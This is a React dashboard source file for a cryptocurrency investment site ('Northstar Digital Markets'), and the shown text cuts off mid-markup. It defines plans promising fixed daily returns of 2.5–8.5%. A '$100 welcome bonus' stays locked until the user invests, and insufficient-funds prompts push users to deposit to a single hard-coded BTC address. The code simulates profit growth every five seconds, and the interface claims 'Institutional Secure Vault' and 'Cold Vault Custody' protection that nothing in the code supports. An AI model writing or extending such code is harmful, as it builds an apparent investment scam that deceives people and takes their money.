import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Logo } from "@/components/Logo";
import { useTheme } from "@/components/ThemeProvider";
import { toast } from "sonner";
import { motion } from "framer-motion";
import {
  Copy,
  Check,
  Wallet,
  TrendingUp,
  ArrowUpRight,
  ArrowDownToLine,
  LogOut,
  Moon,
  Sun,
  Bot,
  Gift,
  Activity,
  ArrowDownCircle,
  ArrowUpCircle,
  Clock,
  Lock,
  Sparkles,
  ShieldCheck,
  CheckCircle2,
  Loader2,
  XCircle,
  ChevronRight,
  Layers,
  Percent,
  RefreshCw,
} from "lucide-react";
import { Input } from "@/components/ui/input";
import {
  LineChart,
  Line,
  ResponsiveContainer,
  XAxis,
  YAxis,
  Tooltip,
  CartesianGrid,
} from "recharts";
import { LiveFeed } from "@/components/LiveFeed";
import { AiTradeTracker } from "@/components/AiTradeTracker";
import { BTC_RECIPIENT_ADDRESS as BTC_ADDRESS } from "@/config/wallet";
import { DepositModal } from "@/components/DepositModal";
import { InsufficientFundsModal } from "@/components/InsufficientFundsModal";
import { AlertTriangle } from "lucide-react";

export const Route = createFileRoute("/dashboard")({
  head: () => ({
    meta: [
      { title: "Secure Dashboard · Northstar Digital Markets" },
      {
        name: "description",
        content:
          "Secure institutional portfolio management, active investment plans, $100 welcome bonus status, and real-time algorithmic trade execution.",
      },
      { property: "og:title", content: "Secure Dashboard · Northstar Digital Markets" },
      {
        property: "og:description",
        content:
          "Institutional-grade portfolio overview, locked welcome bonus tracker, and investment summaries.",
      },
      { property: "og:url", content: "https://globalcoincap.app/dashboard" },
      { property: "og:type", content: "website" },
      { name: "robots", content: "noindex" },
    ],
    links: [{ rel: "canonical", href: "https://globalcoincap.app/dashboard" }],
  }),
  component: Dashboard,
});

const plans = [
  {
    name: "Starter",
    range: "$500 - $10,000",
    minAmount: 500,
    maxAmount: 10000,
    amount: 500,
    bonus: "10% Investment Bonus",
    hash: "50GH/s Hash Power",
    roi: 2.5,
    duration: 14,
    strategy: "Competitive Spreads & Algorithmic Grid",
    perks: [
      "Daily profit",
      "Instant withdrawal",
      "Market Insights",
      "24/7 Client Support",
      "Competitive Spreads",
    ],
  },
  {
    name: "Classic",
    range: "$5,000 - $25,000",
    minAmount: 5000,
    maxAmount: 25000,
    amount: 5000,
    bonus: "15% Investment Bonus",
    hash: "100GH/s Hash Power",
    roi: 3.2,
    duration: 21,
    strategy: "High-Frequency Trend Strategies",
    perks: [
      "Daily profit",
      "Instant withdrawal",
      "Market Insights",
      "24/7 Client Support",
      "High-Frequency Strategies",
    ],
  },
  {
    name: "Pro",
    range: "$30,000 - $150,000",
    minAmount: 30000,
    maxAmount: 150000,
    amount: 30000,
    bonus: "25% Investment Bonus",
    hash: "120GH/s Hash Power",
    featured: true,
    roi: 4.5,
    duration: 30,
    strategy: "Personalized Wealth Planning",
    perks: [
      "Daily profit",
      "Instant withdrawal",
      "Market Insights",
      "24/7 Client Support",
      "High-Frequency Strategies",
      "Personalized Wealth Planning",
    ],
  },
  {
    name: "Executive",
    range: "$100,000 - $350,000",
    minAmount: 100000,
    maxAmount: 350000,
    amount: 100000,
    bonus: "35% Investment Bonus",
    hash: "150GH/s Hash Power",
    roi: 6.0,
    duration: 45,
    strategy: "Dedicated Analyst Neural Flow",
    perks: [
      "Daily profit",
      "Instant withdrawal",
      "Market Insights",
      "24/7 Client Support",
      "High-Frequency Strategies",
      "Personalized Wealth Planning",
      "Dedicated Analyst Access",
    ],
  },
  {
    name: "Golden",
    range: "$1,000,000 - $2,000,000",
    minAmount: 1000000,
    maxAmount: 2000000,
    amount: 1000000,
    bonus: "50% Investment Bonus",
    hash: "350GH/s Hash Power",
    roi: 8.5,
    duration: 60,
    strategy: "Institutional Multi-Chain Prime Engine",
    perks: [
      "Daily profit",
      "Instant withdrawal",
      "Market Insights",
      "24/7 Client Support",
      "High-Frequency Strategies",
      "Personalized Wealth Planning",
      "Dedicated Analyst Access",
    ],
  },
];

type Profile = {
  id: string;
  full_name: string | null;
  email: string | null;
  balance: number;
  bonus_balance: number;
};

type Investment = {
  id: string;
  plan_name: string;
  amount: number;
  daily_roi: number;
  current_value: number;
  started_at: string;
};

type Transaction = {
  id: string;
  type: string;
  amount: number;
  status: string;
  note: string | null;
  created_at: string;
};

function Dashboard() {
  const nav = useNavigate();
  const { theme, toggle } = useTheme();
  const [profile, setProfile] = useState<Profile | null>(null);
  const [investments, setInvestments] = useState<Investment[]>([]);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [wdOpen, setWdOpen] = useState(false);
  const [wdAmount, setWdAmount] = useState("");
  const [wdWallet, setWdWallet] = useState("");
  const [wdSubmitting, setWdSubmitting] = useState(false);
  const [copied, setCopied] = useState(false);
  const [lastSyncTime, setLastSyncTime] = useState<string>("Just now");
  const [depositModalOpen, setDepositModalOpen] = useState(false);
  const [customPlanAmounts, setCustomPlanAmounts] = useState<Record<string, number>>({});
  const [depositPlanContext, setDepositPlanContext] = useState<{
    planName?: string;
    requiredUsd?: number;
    btcAmount?: string;
  }>({});
  const [insufficientModalOpen, setInsufficientModalOpen] = useState(false);
  const [insufficientPlan, setInsufficientPlan] = useState<(typeof plans)[number] | null>(null);

  const openDepositModal = (context?: {
    planName?: string;
    requiredUsd?: number;
    btcAmount?: string;
  }) => {
    if (context) {
      setDepositPlanContext(context);
    } else {
      setDepositPlanContext({});
    }
    setDepositModalOpen(true);
  };

  const load = async () => {
    try {
      const {
        data: { session },
      } = await supabase.auth.getSession();

      if (!session) {
        nav({ to: "/auth" });
        return;
      }

      const [{ data: p }, { data: inv }, { data: tx }] = await Promise.all([
        supabase.from("profiles").select("*").eq("id", session.user.id).maybeSingle(),
        supabase
          .from("investments")
          .select("*")
          .eq("user_id", session.user.id)
          .order("started_at", { ascending: false }),
        supabase
          .from("transactions")
          .select("*")
          .eq("user_id", session.user.id)
          .order("created_at", { ascending: false })
          .limit(25),
      ]);

      setProfile(p as Profile | null);
      setInvestments((inv as Investment[] | null) ?? []);
      setTransactions((tx as Transaction[] | null) ?? []);
      setLastSyncTime(
        new Date().toLocaleTimeString([], {
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
        }),
      );
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  // Auth Guard & listener
  useEffect(() => {
    let isMounted = true;
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (!session && isMounted) {
        nav({ to: "/auth" });
      } else if (isMounted) {
        load();
      }
    });

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange((_event, session) => {
      if (!session && isMounted) {
        nav({ to: "/auth" });
      }
    });

    return () => {
      isMounted = false;
      subscription?.unsubscribe();
    };
  }, []);

  // Realtime subscriptions
  useEffect(() => {
    let uid: string | null = null;
    let channel: ReturnType<typeof supabase.channel> | null = null;
    (async () => {
      const {
        data: { session },
      } = await supabase.auth.getSession();
      if (!session) return;
      uid = session.user.id;
      channel = supabase
        .channel(`dashboard-${uid}`)
        .on(
          "postgres_changes",
          { event: "*", schema: "public", table: "profiles", filter: `id=eq.${uid}` },
          (payload) => {
            if (payload.new) setProfile(payload.new as Profile);
          },
        )
        .on(
          "postgres_changes",
          { event: "*", schema: "public", table: "investments", filter: `user_id=eq.${uid}` },
          () => {
            load();
          },
        )
        .on(
          "postgres_changes",
          { event: "*", schema: "public", table: "transactions", filter: `user_id=eq.${uid}` },
          () => {
            load();
          },
        )
        .subscribe();
    })();
    return () => {
      if (channel) supabase.removeChannel(channel);
    };
  }, []);

  // Simulate live profit growth every 5s
  useEffect(() => {
    if (!investments.length) return;
    const t = setInterval(async () => {
      await supabase.rpc("accrue_my_investments");
      const {
        data: { session },
      } = await supabase.auth.getSession();
      if (!session) return;
      const { data: inv } = await supabase
        .from("investments")
        .select("*")
        .eq("user_id", session.user.id)
        .order("started_at", { ascending: false });
      setInvestments((inv as Investment[] | null) ?? []);
    }, 5000);
    return () => clearInterval(t);
  }, [investments.length]);

  const totalInvested = useMemo(
    () => investments.reduce((s, i) => s + Number(i.amount), 0),
    [investments],
  );

  const currentValue = useMemo(
    () => investments.reduce((s, i) => s + Number(i.current_value), 0),
    [investments],
  );

  const profit = currentValue - totalInvested;
  const profitPercentage = totalInvested > 0 ? (profit / totalInvested) * 100 : 0;

  const cashBalance = Number(profile?.balance ?? 0);
  const bonusBalance = Number(profile?.bonus_balance ?? 100);
  const hasInvestments = investments.length > 0;
  const isBonusLocked = !hasInvestments;

  // Master total portfolio value calculation:
  // Cash balance + Current valuation of investments + $100 Welcome Bonus (included in portfolio valuation)
  const totalPortfolioValue = cashBalance + currentValue + bonusBalance;

  // Percentage breakdown for visual asset allocation bar
  const safeTotal = Math.max(totalPortfolioValue, 100);
  const cashPct = Math.round((cashBalance / safeTotal) * 100);
  const investPct = Math.round((currentValue / safeTotal) * 100);
  const bonusPct = Math.max(1, 100 - cashPct - investPct);

  const chartData = useMemo(() => {
    const base = totalInvested || 1000;
    return Array.from({ length: 14 }).map((_, i) => ({
      day: `D${i + 1}`,
      value: Math.round(base + (profit * (i + 1)) / 14 + Math.sin(i) * (base * 0.01)),
    }));
  }, [totalInvested, profit]);

  const handleManualRefresh = async () => {
    setRefreshing(true);
    await load();
    toast.success("Portfolio data updated from secure ledger");
  };

  const startPlan = async (plan: (typeof plans)[number], chosenAmount?: number) => {
    const targetAmount =
      chosenAmount && chosenAmount >= plan.minAmount ? chosenAmount : plan.amount;

    // 1. Mandatory cash balance check: Each trade/investment is deployed from liquid cash balance
    if (cashBalance < targetAmount) {
      const shortfall = targetAmount - cashBalance;
      toast.error(
        `Insufficient funds: Your available cash balance is $${cashBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}, but the ${plan.name} plan requires $${targetAmount.toLocaleString()}. Please deposit funds first.`,
        {
          duration: 6000,
          action: {
            label: "Deposit BTC",
            onClick: () => {
              openDepositModal({
                planName: plan.name,
                requiredUsd: shortfall,
                btcAmount: (shortfall / 67452.18).toFixed(5),
              });
            },
          },
        },
      );
      setInsufficientPlan({ ...plan, amount: targetAmount });
      setInsufficientModalOpen(true);
      return;
    }

    const wasBonusLocked = investments.length === 0;
    const { error } = await supabase.rpc("start_investment_plan", {
      p_plan_name: plan.name,
      p_amount: targetAmount,
    });
    if (error) return toast.error(error.message);

    if (wasBonusLocked) {
      toast.success(
        `🎉 Congratulations! Your $100 Welcome Bonus has been UNLOCKED and activated with your ${plan.name} plan!`,
        { duration: 6500 },
      );
      try {
        const {
          data: { session },
        } = await supabase.auth.getSession();
        if (session) {
          await supabase.from("transactions").insert({
            user_id: session.user.id,
            type: "bonus",
            amount: 100,
            status: "completed",
            note: `Welcome Bonus ($100) Unlocked via ${plan.name} Plan`,
            created_at: new Date().toISOString(),
          });
        }
      } catch (err: unknown) {
        console.warn("Could not log bonus transaction", err);
      }
    } else {
      toast.success(
        `${plan.name} plan ($${targetAmount.toLocaleString()}) activated. AI is now trading for you.`,
      );
    }
    load();
  };

  const submitWithdraw = async () => {
    const amt = Number(wdAmount);
    if (!amt || amt <= 0) return toast.error("Enter a valid amount");
    if (!wdWallet || wdWallet.trim().length < 10)
      return toast.error("Enter a valid wallet address");
    if (amt > cashBalance) return toast.error("Insufficient available cash balance");
    setWdSubmitting(true);
    const { error } = await supabase.rpc("process_withdrawal", {
      p_amount: amt,
      p_wallet: wdWallet.trim(),
    });
    setWdSubmitting(false);
    if (error) return toast.error(error.message);
    toast.success(`Withdrawal of $${amt.toLocaleString()} submitted. Secure ledger updated.`);
    setWdAmount("");
    setWdWallet("");
    setWdOpen(false);
    load();
  };

  const copyAddr = () => {
    navigator.clipboard.writeText(BTC_ADDRESS).then(() => {
      setCopied(true);
      toast.success("BTC deposit address copied to clipboard");
      setTimeout(() => setCopied(false), 2500);
    });
  };

  const logout = async () => {
    await supabase.auth.signOut();
    nav({ to: "/" });
  };

  if (loading) {
    return (
      <div className="min-h-screen grid place-items-center bg-background text-muted-foreground">
        <div className="flex flex-col items-center gap-3">
          <Loader2 className="h-8 w-8 animate-spin text-accent" />
          <div className="text-sm font-medium">Verifying encrypted investor session…</div>
          <div className="text-xs text-muted-foreground">256-bit TLS connection established</div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background text-foreground flex flex-col">
      {/* Top institutional header */}
      <header className="border-b border-border bg-background/80 backdrop-blur-md sticky top-0 z-30">
        <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Logo />
            <div className="hidden md:flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-accent/10 border border-accent/25 text-[11px] font-medium text-accent">
              <ShieldCheck className="h-3.5 w-3.5" />
              <span>Institutional Secure Vault</span>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="sm"
              onClick={handleManualRefresh}
              className="text-xs text-muted-foreground hover:text-foreground hidden sm:inline-flex"
            >
              <RefreshCw className={`h-3.5 w-3.5 mr-1.5 ${refreshing ? "animate-spin" : ""}`} />
              Sync Ledger
            </Button>
            <Button variant="ghost" size="icon" aria-label="Toggle theme" onClick={toggle}>
              {theme === "dark" ? <Sun className="h-4 w-4" /> : <Moon className="h-4 w-4" />}
            </Button>
            <Button variant="ghost" size="sm" onClick={logout} className="text-xs">
              <LogOut className="h-4 w-4 mr-1.5" /> Sign out
            </Button>
          </div>
        </div>
      </header>

      {/* Security Status Bar */}
      <div className="border-b border-border/60 bg-card/40 text-[11px] text-muted-foreground py-2 px-4">
        <div className="max-w-6xl mx-auto flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-4 flex-wrap">
            <span className="flex items-center gap-1.5 text-accent font-medium">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-accent opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-accent"></span>
              </span>
              Encrypted Session (TLS 1.3 · AES-256)
            </span>
            <span className="hidden sm:inline">|</span>
            <span className="hidden sm:inline">Cold Vault Custody Protected</span>
            <span className="hidden md:inline">|</span>
            <span className="hidden md:inline">Synced: {lastSyncTime}</span>
          </div>
          <div className="flex items-center gap-2 font-mono">
            <span>Investor ID:</span>
            <span className="text-foreground bg-muted px-1.5 py-0.5 rounded text-[10px]">
              usr_{profile?.id ? profile.id.slice(0, 8) : "verified"}
            </span>
          </div>
        </div>
      </div>

      <main className="max-w-6xl mx-auto px-4 py-8 space-y-6 flex-1 w-full">
        {/* Welcome & Investor greeting */}
        <motion.div
          initial={{ opacity: 0, y: 8 }}
          animate={{ opacity: 1, y: 0 }}
          className="flex flex-col sm:flex-row sm:items-center justify-between gap-2"
        >
          <div>
            <div className="text-xs uppercase tracking-widest text-muted-foreground font-semibold">
              Secure Portfolio Overview
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold mt-0.5">
              {profile?.full_name || profile?.email || "Investor Account"}
            </h1>
          </div>
          <div className="flex items-center gap-2">
            <Button
              size="sm"
              onClick={() => openDepositModal()}
              className="bg-accent text-accent-foreground hover:bg-accent/90 text-xs font-semibold"
            >
              <ArrowUpRight className="h-3.5 w-3.5 mr-1" /> Deposit BTC
            </Button>
            <Button size="sm" variant="outline" onClick={() => setWdOpen(true)} className="text-xs">
              <ArrowDownToLine className="h-3.5 w-3.5 mr-1" /> Withdraw
            </Button>
          </div>
        </motion.div>

        {/* HERO: Grand Master Portfolio Balance Panel */}
        <section className="rounded-3xl border border-border bg-gradient-to-b from-card via-card to-background p-6 sm:p-8 shadow-sm relative overflow-hidden">
          <div className="absolute top-0 right-0 w-80 h-80 bg-accent/5 rounded-full blur-3xl pointer-events-none -mr-20 -mt-20" />

          <div className="relative z-10 flex flex-col md:flex-row md:items-end justify-between gap-6">
            <div>
              <div className="flex items-center gap-2 mb-2">
                <span className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                  Total Portfolio Balance
                </span>
                <span className="text-[10px] uppercase font-bold px-2 py-0.5 rounded-full bg-accent/15 text-accent border border-accent/30">
                  USD Net Value
                </span>
              </div>

              <div className="text-4xl sm:text-5xl font-extrabold tracking-tight tabular-nums text-foreground">
                $
                {totalPortfolioValue.toLocaleString(undefined, {
                  minimumFractionDigits: 2,
                  maximumFractionDigits: 2,
                })}
              </div>

              <div className="flex items-center gap-3 mt-3 text-xs flex-wrap">
                <div className="flex items-center gap-1.5 font-medium">
                  {profit >= 0 ? (
                    <span className="text-accent flex items-center gap-1">
                      <TrendingUp className="h-3.5 w-3.5" />
                      +${profit.toFixed(2)} (
                      {profitPercentage >= 0 ? `+${profitPercentage.toFixed(2)}%` : "0.00%"}) total
                      AI yield
                    </span>
                  ) : (
                    <span className="text-destructive flex items-center gap-1">
                      -${Math.abs(profit).toFixed(2)} ({profitPercentage.toFixed(2)}%)
                    </span>
                  )}
                </div>
                <span className="text-muted-foreground">·</span>
                <span className="text-muted-foreground">
                  Includes <strong className="text-foreground">${bonusBalance.toFixed(2)}</strong>{" "}
                  welcome bonus
                </span>
              </div>
            </div>

            {/* Quick summary pill block */}
            <div className="flex items-center gap-2 flex-wrap">
              <div className="px-3.5 py-2 rounded-xl bg-background/80 border border-border text-left">
                <div className="text-[10px] text-muted-foreground uppercase font-medium">
                  Liquid Cash
                </div>
                <div className="text-sm font-bold tabular-nums">
                  ${cashBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </div>
              </div>
              <div className="px-3.5 py-2 rounded-xl bg-background/80 border border-border text-left">
                <div className="text-[10px] text-muted-foreground uppercase font-medium">
                  AI Active Assets
                </div>
                <div className="text-sm font-bold tabular-nums text-accent">
                  ${currentValue.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </div>
              </div>
              <div
                className={`px-3.5 py-2 rounded-xl text-left border ${isBonusLocked ? "bg-amber-500/10 border-amber-500/30 text-amber-400" : "bg-accent/10 border-accent/30 text-accent"}`}
              >
                <div className="text-[10px] uppercase font-medium flex items-center gap-1">
                  {isBonusLocked ? (
                    <Lock className="h-2.5 w-2.5" />
                  ) : (
                    <Sparkles className="h-2.5 w-2.5" />
                  )}
                  Bonus
                </div>
                <div className="text-sm font-bold tabular-nums">${bonusBalance.toFixed(2)}</div>
              </div>
            </div>
          </div>

          {/* Asset Allocation Progress Bar */}
          <div className="mt-6 pt-6 border-t border-border/70">
            <div className="flex items-center justify-between text-xs text-muted-foreground mb-2">
              <span className="font-medium">Portfolio Asset Allocation</span>
              <span className="tabular-nums">100% Total Assets</span>
            </div>
            <div className="h-2.5 w-full rounded-full bg-muted overflow-hidden flex">
              <div
                style={{ width: `${Math.max(cashPct, 2)}%` }}
                className="h-full bg-foreground/60 transition-all duration-500"
                title={`Available Cash: ${cashPct}%`}
              />
              <div
                style={{ width: `${Math.max(investPct, hasInvestments ? 5 : 0)}%` }}
                className="h-full bg-accent transition-all duration-500"
                title={`AI Trading Assets: ${investPct}%`}
              />
              <div
                style={{ width: `${Math.max(bonusPct, 2)}%` }}
                className={`h-full transition-all duration-500 ${isBonusLocked ? "bg-amber-400" : "bg-emerald-400"}`}
                title={`Welcome Bonus: ${bonusPct}%`}
              />
            </div>
            <div className="flex items-center gap-4 mt-2.5 text-[11px] text-muted-foreground flex-wrap">
              <div className="flex items-center gap-1.5">
                <span className="h-2 w-2 rounded-full bg-foreground/60" />
                <span>Liquid Cash ({cashPct}%)</span>
              </div>
              <div className="flex items-center gap-1.5">
                <span className="h-2 w-2 rounded-full bg-accent" />
                <span>Active AI Investments ({investPct}%)</span>
              </div>
              <div className="flex items-center gap-1.5">
                <span
                  className={`h-2 w-2 rounded-full ${isBonusLocked ? "bg-amber-400" : "bg-emerald-400"}`}
                />
                <span
                  className={
                    isBonusLocked ? "text-amber-400 font-medium" : "text-emerald-400 font-medium"
                  }
                >
                  $100 Welcome Bonus ({isBonusLocked ? "Locked" : "Active"})
                </span>
              </div>
            </div>
          </div>
        </section>

        {/* 3 Core Metric Breakdown Cards */}
        <div className="grid sm:grid-cols-3 gap-4">
          {/* Card 1: Liquid Cash */}
          <div className="rounded-2xl border border-border bg-card p-5">
            <div className="flex items-center justify-between text-muted-foreground text-sm mb-2">
              <span className="font-medium">Available cash balance</span>
              <Wallet className="h-5 w-5 text-muted-foreground" />
            </div>
            <div className="text-2xl sm:text-3xl font-extrabold tabular-nums">
              ${cashBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
            </div>
            <div className="text-xs text-muted-foreground mt-2 flex items-center justify-between">
              <span>Ready for withdrawal</span>
              <button
                onClick={() => setWdOpen(true)}
                className="text-accent hover:underline font-medium"
              >
                Withdraw →
              </button>
            </div>
          </div>

          {/* Card 2: Active Investments */}
          <div className="rounded-2xl border border-border bg-card p-5">
            <div className="flex items-center justify-between text-muted-foreground text-sm mb-2">
              <span className="font-medium">Current portfolio value</span>
              <TrendingUp className="h-5 w-5 text-accent" />
            </div>
            <div className="text-2xl sm:text-3xl font-extrabold tabular-nums">
              ${currentValue.toLocaleString(undefined, { minimumFractionDigits: 2 })}
            </div>
            <div className="text-xs text-accent mt-2 font-medium flex items-center justify-between">
              <span>
                {profit >= 0
                  ? `+$${profit.toFixed(2)} net profit`
                  : `-$${Math.abs(profit).toFixed(2)}`}
              </span>
              <span className="text-muted-foreground">
                {investments.length} plan{investments.length === 1 ? "" : "s"}
              </span>
            </div>
          </div>

          {/* Card 3: $100 Welcome Bonus Card */}
          <div
            className={`rounded-2xl border p-5 transition-all ${
              isBonusLocked
                ? "border-amber-500/40 bg-amber-500/5 shadow-[0_0_25px_-5px_rgba(245,158,11,0.15)]"
                : "border-accent/40 bg-accent/5 glow-accent"
            }`}
          >
            <div className="flex items-center justify-between text-muted-foreground mb-2">
              <div className="flex items-center gap-2">
                <Gift className={`h-5 w-5 ${isBonusLocked ? "text-amber-400" : "text-accent"}`} />
                <span className="text-sm font-medium">Welcome bonus</span>
              </div>
              <span
                className={`text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-full ${
                  isBonusLocked
                    ? "bg-amber-500/20 text-amber-400 border border-amber-500/30"
                    : "bg-accent text-accent-foreground"
                }`}
              >
                {isBonusLocked ? "🔒 Locked" : "✅ Unlocked"}
              </span>
            </div>
            <div className="text-2xl sm:text-3xl font-extrabold tabular-nums">
              ${bonusBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
            </div>
            <div className="text-xs mt-2 flex items-center justify-between font-medium">
              {isBonusLocked ? (
                <>
                  <span className="text-amber-400/90 flex items-center gap-1">
                    <Lock className="h-3 w-3 text-amber-400 shrink-0" />
                    Invest to unlock
                  </span>
                  <button
                    onClick={() =>
                      document
                        .getElementById("investment-plans")
                        ?.scrollIntoView({ behavior: "smooth" })
                    }
                    className="text-amber-400 underline text-[11px] font-semibold"
                  >
                    Unlock now ↓
                  </button>
                </>
              ) : (
                <div className="text-accent flex items-center gap-1.5">
                  <Sparkles className="h-3 w-3 text-accent shrink-0" />
                  <span>Compounding with active plans</span>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Welcome Bonus Callout Banner */}
        {isBonusLocked ? (
          <div className="rounded-2xl border border-amber-500/40 bg-gradient-to-r from-amber-500/10 via-amber-500/5 to-transparent p-5 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
            <div className="flex items-start gap-3.5">
              <div className="h-11 w-11 rounded-xl bg-amber-500/20 border border-amber-500/30 grid place-items-center text-amber-400 text-xl font-bold shrink-0">
                <Lock className="h-5 w-5" />
              </div>
              <div>
                <div className="font-bold text-foreground flex items-center gap-2">
                  $100 Welcome Bonus Reserved for You (Locked)
                  <span className="text-[10px] uppercase font-bold tracking-wider px-2 py-0.5 rounded bg-amber-500/20 text-amber-400 border border-amber-500/30">
                    Action Required
                  </span>
                </div>
                <p className="text-xs text-muted-foreground mt-1 max-w-xl leading-relaxed">
                  Your <strong className="text-foreground">$100 registration bonus</strong> is
                  credited to your portfolio reserve! To unlock this $100 into active compounding
                  yield, simply choose and activate any AI trading plan below.
                </p>
              </div>
            </div>
            <Button
              onClick={() => {
                document.getElementById("investment-plans")?.scrollIntoView({ behavior: "smooth" });
              }}
              className="bg-amber-500 hover:bg-amber-600 text-black font-bold text-xs shrink-0 shadow-sm"
            >
              Unlock $100 Bonus Below ↓
            </Button>
          </div>
        ) : (
          <div className="rounded-2xl border border-accent/40 bg-accent/10 p-4 flex items-center gap-3">
            <div className="h-9 w-9 rounded-xl bg-accent/20 grid place-items-center text-accent shrink-0">
              <Sparkles className="h-4 w-4" />
            </div>
            <div className="text-xs text-foreground flex-1">
              <strong className="text-accent">Welcome Bonus Unlocked!</strong> Your $100
              registration bonus is actively compounding daily alongside your AI trading strategies.
            </div>
          </div>
        )}

        {/* SECTION: Comprehensive Summary of Investments */}
        <section className="rounded-3xl border border-border bg-card p-6 sm:p-7 space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-border pb-5">
            <div>
              <div className="flex items-center gap-2">
                <Layers className="h-5 w-5 text-accent" />
                <h2 className="text-xl font-bold">Investment Portfolio Summary</h2>
              </div>
              <p className="text-xs text-muted-foreground mt-1">
                Real-time performance, active algorithmic plans, and yield accrual summaries
              </p>
            </div>
            <div className="flex items-center gap-2">
              <span
                className={`text-xs px-2.5 py-1 rounded-full font-semibold flex items-center gap-1.5 ${hasInvestments ? "bg-accent/15 text-accent" : "bg-muted text-muted-foreground"}`}
              >
                <span
                  className={`h-2 w-2 rounded-full ${hasInvestments ? "bg-accent animate-pulse" : "bg-muted-foreground"}`}
                />
                {hasInvestments
                  ? `${investments.length} Active Strategy${investments.length > 1 ? "ies" : ""}`
                  : "No Active Strategies"}
              </span>
            </div>
          </div>

          {/* KPI Summary strip */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
            <div className="rounded-xl border border-border/80 bg-background/50 p-4">
              <div className="text-[11px] text-muted-foreground uppercase font-medium">
                Principal Committed
              </div>
              <div className="text-xl font-bold mt-1 tabular-nums">
                ${totalInvested.toLocaleString(undefined, { minimumFractionDigits: 2 })}
              </div>
            </div>
            <div className="rounded-xl border border-border/80 bg-background/50 p-4">
              <div className="text-[11px] text-muted-foreground uppercase font-medium">
                Current Valuation
              </div>
              <div className="text-xl font-bold mt-1 tabular-nums text-foreground">
                ${currentValue.toLocaleString(undefined, { minimumFractionDigits: 2 })}
              </div>
            </div>
            <div className="rounded-xl border border-border/80 bg-background/50 p-4">
              <div className="text-[11px] text-muted-foreground uppercase font-medium">
                Net Accrued Yield
              </div>
              <div
                className={`text-xl font-bold mt-1 tabular-nums ${profit >= 0 ? "text-accent" : "text-destructive"}`}
              >
                {profit >= 0 ? "+" : "-"}${Math.abs(profit).toFixed(2)}
              </div>
            </div>
            <div className="rounded-xl border border-border/80 bg-background/50 p-4">
              <div className="text-[11px] text-muted-foreground uppercase font-medium">
                Avg. Daily ROI
              </div>
              <div className="text-xl font-bold mt-1 tabular-nums text-accent">
                {hasInvestments
                  ? `${(investments.reduce((s, i) => s + Number(i.daily_roi), 0) / investments.length).toFixed(1)}% / day`
                  : "0.0% / day"}
              </div>
            </div>
          </div>

          {/* Investment Detail Cards or Zero-State Guidance */}
          {investments.length === 0 ? (
            <div className="rounded-2xl border border-dashed border-border bg-background/40 p-8 text-center space-y-4">
              <div className="h-12 w-12 rounded-2xl bg-accent/10 text-accent grid place-items-center mx-auto">
                <Gift className="h-6 w-6" />
              </div>
              <div className="max-w-md mx-auto">
                <h3 className="text-base font-bold">Ready to Start Compounding</h3>
                <p className="text-xs text-muted-foreground mt-1 leading-relaxed">
                  You currently have no active investment plans running. Your{" "}
                  <strong>$100 Welcome Bonus</strong> is locked in reserve. Choose any AI trading
                  plan below to unlock your bonus and begin earning daily automated returns.
                </p>
              </div>
              <div className="pt-2">
                <Button
                  onClick={() =>
                    document
                      .getElementById("investment-plans")
                      ?.scrollIntoView({ behavior: "smooth" })
                  }
                  className="bg-accent text-accent-foreground hover:bg-accent/90 text-xs font-semibold"
                >
                  Explore AI Plans to Unlock $100 Bonus
                  <ChevronRight className="h-4 w-4 ml-1" />
                </Button>
              </div>
            </div>
          ) : (
            <div className="space-y-3">
              <div className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">
                Active Strategy Holdings
              </div>
              {investments.map((inv) => {
                const profitInv = Number(inv.current_value) - Number(inv.amount);
                const roiPct = Number(inv.amount) > 0 ? (profitInv / Number(inv.amount)) * 100 : 0;
                const matchingPlan = plans.find(
                  (p) => p.name.toLowerCase() === inv.plan_name.toLowerCase(),
                );
                const strategyName = matchingPlan?.strategy || "Quantitative Trend Following";

                return (
                  <div
                    key={inv.id}
                    className="rounded-2xl border border-border bg-card p-5 hover:border-accent/40 transition-colors"
                  >
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                      <div>
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="font-bold text-base">{inv.plan_name} Plan</span>
                          <span className="text-[10px] uppercase font-bold px-2 py-0.5 rounded bg-accent/15 text-accent">
                            {inv.daily_roi}% Daily ROI
                          </span>
                          <span className="text-[10px] text-muted-foreground bg-muted px-2 py-0.5 rounded">
                            {strategyName}
                          </span>
                        </div>
                        <div className="text-xs text-muted-foreground mt-1 flex items-center gap-2">
                          <Clock className="h-3.5 w-3.5" />
                          <span>
                            Started{" "}
                            {new Date(inv.started_at).toLocaleDateString(undefined, {
                              month: "short",
                              day: "numeric",
                              year: "numeric",
                            })}
                          </span>
                          <span>·</span>
                          <span className="text-accent flex items-center gap-1">
                            <Bot className="h-3 w-3" /> AI Arbitrage Active
                          </span>
                        </div>
                      </div>

